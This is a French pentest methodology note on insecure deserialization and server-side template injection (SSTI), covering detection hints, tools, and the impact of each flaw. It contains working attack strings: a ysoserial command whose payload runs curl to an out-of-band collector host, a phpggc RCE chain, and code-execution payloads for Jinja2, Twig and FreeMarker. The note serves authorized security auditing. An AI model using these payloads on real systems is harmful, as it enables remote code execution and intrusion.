---
title: Désérialisation et injection de gabarits (SSTI)
tags:
  - offensif/audit-web-api
  - pentest
  - web
  - owasp
  - deserialisation
  - ssti
---

# Désérialisation et injection de gabarits (SSTI)

> **Note.** Principe
> Deux classes de vulnérabilités distinctes regroupées ici car toutes deux conduisent fréquemment à une exécution de code à distance (RCE) : la désérialisation non sécurisée de données (A08:2021) et l'injection de gabarits côté serveur (SSTI, sous-catégorie d'injection A03:2021).

## Désérialisation non sécurisée

### Principe

Une application reconstruit un objet applicatif à partir de données sérialisées fournies par l'utilisateur (cookie, paramètre, en-tête) sans vérifier leur provenance. Si le moteur de désérialisation exécute du code lors de la reconstruction de l'objet (constructeurs, méthodes magiques), un attaquant peut forger une charge utile déclenchant une exécution de code.

| Langage / format | Indice de détection | Outil d'exploitation |
|---|---|---|
| Java (`ObjectInputStream`) | Cookie ou paramètre en Base64 débutant par `rO0` (magic bytes `AC ED`) | `ysoserial` |
| PHP (`unserialize()`) | Chaîne débutant par `O:`, `a:`, `s:` | Gadget chains spécifiques au framework (PHPGGC) |
| Python (`pickle`) | Paramètre binaire suspect, en-tête `\x80\x04` | Génération manuelle d'un payload `pickle` |
| .NET (`BinaryFormatter`, ViewState) | Paramètre `__VIEWSTATE` ASP.NET | `ysoserial.net` |

```bash
# Génération d'une charge Java avec ysoserial
java -jar ysoserial.jar CommonsCollections6 'curl http://collab.oastify.com' | base64 -w0

# Génération d'une chaîne de gadgets PHP avec phpggc
phpggc Laravel/RCE1 system 'id' -b
```

> **Note.** Détection par canal hors bande
> Une désérialisation vulnérable ne provoque pas toujours une erreur visible. Utiliser une charge utile déclenchant une requête DNS/HTTP sortante vers un collecteur contrôlé (Burp Collaborator, interactsh) permet de confirmer l'exécution même sans retour direct dans la réponse HTTP.

## SSTI (Server-Side Template Injection)

### Principe

Une entrée utilisateur est intégrée dans un gabarit (template) évalué côté serveur avant rendu, permettant d'injecter de la syntaxe de template plutôt qu'une simple donnée.

```
Entrée testée : {{7*7}}
Réponse contenant "49" → moteur de template évaluant l'expression → SSTI confirmé
```

### Détection par moteur de template

| Moteur | Payload de détection | Syntaxe RCE (exemple) |
|---|---|---|
| Jinja2 (Python/Flask) | `{{7*7}}` → `49` | `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}` |
| Twig (PHP/Symfony) | `{{7*7}}` → `49` | `{{ ['id']\|filter('system') }}` |
| FreeMarker (Java) | `${7*7}` → `49` | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` |
| Velocity (Java) | `#set($x=7*7)$x` → `49` | `#set($e="exec")` via classe `Runtime` réflexive |

> **Note.** Différencier XSS et SSTI
> Injecter `${{7*7}}` (ou `{{7*7}}{{7*'7'}}`) : un rendu `49` sans le second terme évalué indique un moteur côté serveur (SSTI), tandis qu'un simple reflet non évalué oriente plutôt vers un XSS classique.

## Impact commun

- Exécution de commandes arbitraires sur le serveur applicatif (RCE).
- Rebond vers le réseau interne depuis le serveur compromis.
- Compromission complète de la confidentialité, de l'intégrité et de la disponibilité de l'application.

> **Note.** Cadre d'usage
> Ces techniques mènent fréquemment à une exécution de code à distance : à
> n'exécuter que dans le périmètre couvert par le mandat — voir
> [Preambule-et-cadre-legal-Audit-Web-API](../00-Methodologie/Preambule-et-cadre-legal-Audit-Web-API.md).

## Voir également

- [Injection-SQL](Injection-SQL.md)
- [Methodologie-generale](../00-Methodologie/Methodologie-generale.md)
- [Audit-Web-et-API-MOC](../Audit-Web-et-API-MOC.md)
